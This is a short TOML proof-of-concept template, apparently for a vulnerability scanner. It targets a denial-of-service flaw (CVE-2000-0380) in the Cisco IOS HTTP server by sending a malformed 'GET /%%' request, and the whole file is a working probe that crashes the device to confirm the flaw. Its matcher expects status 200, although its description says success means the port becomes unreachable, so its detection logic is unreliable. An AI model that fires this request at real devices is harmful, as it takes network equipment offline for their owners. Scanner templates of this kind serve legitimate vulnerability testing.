[info]
author = "ave"
description = "向 Cisco IOS 设备 HTTP 服务发送包含 %% 的畸形 URL 请求，触发输入验证缺陷导致设备拒绝服务。验证方式：发送 GET /%% HTTP/1.0 后检查目标 HTTP 端口是否不可达。"
id = "POC-AVE-2000-0315"
name = "Cisco IOS HTTP %% 拒绝服务漏洞 PoC"
severity = "high"
tags = ["ave-2000-0315"]
vuln_id = [
    "CVE-2000-0380",
    "AVE-2000-0315",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/%%"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
